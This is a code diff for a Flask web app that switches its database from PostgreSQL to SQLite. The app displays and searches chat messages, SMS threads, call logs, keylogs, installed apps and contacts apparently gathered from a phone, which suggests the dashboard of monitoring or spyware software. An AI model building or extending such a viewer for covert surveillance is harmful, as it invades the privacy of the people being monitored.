@@ -1,7 +1,5 @@
 from flask import Flask, render_template, send_from_directory, request, jsonify
-import os
-import psycopg2
-from psycopg2.extras import DictCursor
+import sqlite3
 import logging
 
 # Set up logging
@@ -13,10 +11,10 @@ app = Flask(__name__, template_folder='templates', static_folder='static')
 # Database connection
 def get_db_connection():
     try:
-        conn = psycopg2.connect(os.getenv('DATABASE_URL'))
-        conn.cursor_factory = DictCursor
+        conn = sqlite3.connect('data.db')
+        conn.row_factory = sqlite3.Row  # Access columns by name
         return conn
-    except Exception as e:
+    except sqlite3.Error as e:
         logger.error(f"Database connection error: {e}")
         return None
 
@@ -31,14 +29,15 @@ def index():
     try:
         conn = get_db_connection()
         if conn:
-            with conn.cursor() as cur:
-                cur.execute("""
-                    SELECT DISTINCT sender AS name FROM ChatMessages 
-                    UNION 
-                    SELECT DISTINCT from_to AS name FROM SMS
-                    ORDER BY name
-                """)
-                contacts = cur.fetchall()
+            cur = conn.cursor()
+            cur.execute("""
+                SELECT DISTINCT sender AS name FROM ChatMessages 
+                UNION 
+                SELECT DISTINCT from_to AS name FROM SMS
+                ORDER BY name
+            """)
+            contacts = cur.fetchall()
+            cur.close()
             conn.close()
         else:
             contacts = []
@@ -54,13 +53,14 @@ def chat(name):
     try:
         conn = get_db_connection()
         if conn:
-            with conn.cursor() as cur:
-                cur.execute("""
-                    SELECT * FROM ChatMessages 
-                    WHERE sender = %s 
-                    ORDER BY time
-                """, (name,))
-                messages = cur.fetchall()
+            cur = conn.cursor()
+            cur.execute("""
+                SELECT * FROM ChatMessages 
+                WHERE sender = ? 
+                ORDER BY time
+            """, (name,))
+            messages = cur.fetchall()
+            cur.close()
             conn.close()
         else:
             messages = []
@@ -74,13 +74,14 @@ def sms_thread(name):
     try:
         conn = get_db_connection()
         if conn:
-            with conn.cursor() as cur:
-                cur.execute("""
-                    SELECT * FROM SMS 
-                    WHERE from_to = %s 
-                    ORDER BY time
-                """, (name,))
-                sms_messages = cur.fetchall()
+            cur = conn.cursor()
+            cur.execute("""
+                SELECT * FROM SMS 
+                WHERE from_to = ? 
+                ORDER BY time
+            """, (name,))
+            sms_messages = cur.fetchall()
+            cur.close()
             conn.close()
         else:
             sms_messages = []
@@ -94,9 +95,10 @@ def calls():
     try:
         conn = get_db_connection()
         if conn:
-            with conn.cursor() as cur:
-                cur.execute('SELECT * FROM Calls ORDER BY time DESC')
-                call_logs = cur.fetchall()
+            cur = conn.cursor()
+            cur.execute('SELECT * FROM Calls ORDER BY time DESC')
+            call_logs = cur.fetchall()
+            cur.close()
             conn.close()
             return render_template('calls.html', call_logs=call_logs)
         return render_template('calls.html', call_logs=[])
@@ -109,9 +111,10 @@ def keylogs():
     try:
         conn = get_db_connection()
         if conn:
-            with conn.cursor() as cur:
-                cur.execute('SELECT * FROM Keylogs ORDER BY time DESC')
-                keylogs = cur.fetchall()
+            cur = conn.cursor()
+            cur.execute('SELECT * FROM Keylogs ORDER BY time DESC')
+            keylogs = cur.fetchall()
+            cur.close()
             conn.close()
             return render_template('keylogs.html', keylogs=keylogs)
         return render_template('keylogs.html', keylogs=[])
@@ -124,9 +127,10 @@ def installed_apps():
     try:
         conn = get_db_connection()
         if conn:
-            with conn.cursor() as cur:
-                cur.execute('SELECT * FROM InstalledApps ORDER BY install_date DESC')
-                apps = cur.fetchall()
+            cur = conn.cursor()
+            cur.execute('SELECT * FROM InstalledApps ORDER BY install_date DESC')
+            apps = cur.fetchall()
+            cur.close()
             conn.close()
             return render_template('installed_apps.html', installed_apps=apps)
         return render_template('installed_apps.html', installed_apps=[])
@@ -139,9 +143,10 @@ def contacts_list():
     try:
         conn = get_db_connection()
         if conn:
-            with conn.cursor() as cur:
-                cur.execute('SELECT * FROM Contacts ORDER BY name')
-                contacts = cur.fetchall()
+            cur = conn.cursor()
+            cur.execute('SELECT * FROM Contacts ORDER BY name')
+            contacts = cur.fetchall()
+            cur.close()
             conn.close()
             return render_template('contacts.html', contacts=contacts)
         return render_template('contacts.html', contacts=[])
@@ -160,41 +165,44 @@ def search():
         if not conn:
             return jsonify({'error': 'Could not connect to database'}), 500
 
-        results = []
-        with conn.cursor() as cur:
-            # Search chat messages
-            cur.execute("""
-                SELECT sender, text, time 
-                FROM ChatMessages 
-                WHERE text ILIKE %s 
-                ORDER BY time
-            """, (f'%{search_term}%',))
-            chat_results = cur.fetchall()
+        cur = conn.cursor()
+        
+        # Search chat messages
+        cur.execute("""
+            SELECT sender, text, time 
+            FROM ChatMessages 
+            WHERE text LIKE ? 
+            ORDER BY time
+        """, (f'%{search_term}%',))
+        chat_results = cur.fetchall()
 
-            # Search SMS messages
-            cur.execute("""
-                SELECT from_to, text, time 
-                FROM SMS 
-                WHERE text ILIKE %s 
-                ORDER BY time
-            """, (f'%{search_term}%',))
-            sms_results = cur.fetchall()
+        # Search SMS messages
+        cur.execute("""
+            SELECT from_to, text, time 
+            FROM SMS 
+            WHERE text LIKE ? 
+            ORDER BY time
+        """, (f'%{search_term}%',))
+        sms_results = cur.fetchall()
 
+        cur.close()
         conn.close()
 
-        for result in chat_results:
+        results = []
+        for row in chat_results:
             results.append({
                 'type': 'chat',
-                'name': result['sender'],
-                'text': result['text'],
-                'time': result['time'].strftime('%Y-%m-%d %H:%M:%S')
+                'name': row['sender'],
+                'text': row['text'],
+                'time': row['time']
             })
-        for result in sms_results:
+        
+        for row in sms_results:
             results.append({
                 'type': 'sms',
-                'name': result['from_to'],
-                'text': result['text'],
-                'time': result['time'].strftime('%Y-%m-%d %H:%M:%S')
+                'name': row['from_to'],
+                'text': row['text'],
+                'time': row['time']
             })
 
         return jsonify(results)
